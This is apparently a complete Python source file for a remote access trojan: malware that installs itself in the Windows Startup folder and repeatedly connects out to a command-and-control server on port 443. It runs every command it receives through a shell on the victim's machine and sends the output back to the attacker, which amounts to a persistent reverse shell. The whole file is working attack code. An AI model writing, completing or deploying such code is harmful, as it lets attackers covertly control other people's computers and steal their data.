import socket
import subprocess
import threading
import time
import os

CCIP = ""
CCPORT = 443

# For persistance purposes, when the client restarts will copy the RAT to the desired location and autorun
def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))


# connect to the client IP
def conn(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)


"""
Params:
    - client: a connected socket (an open connection to the attacker's CC)
    - data: a command string (like dir, ls, ipconfig, etc.)
Receives a command, runs it on the victim's machine, captures the output or error, 
and sends the result back to the attacker's server.
"""
def cmd(client, data):
    try:
        # pipe output and errors from the target machine back to the cc server
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as error:
        print(error)

"""
Keeps listening for commands. Every command (except /:kill) is executed in parallel using a thread, 
and the output is sent back to the server.
"""
def cli(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()

            # if received kill will stop sending commands but will maintain the connection
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        client.close()

if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)
        else:
            time.sleep(3)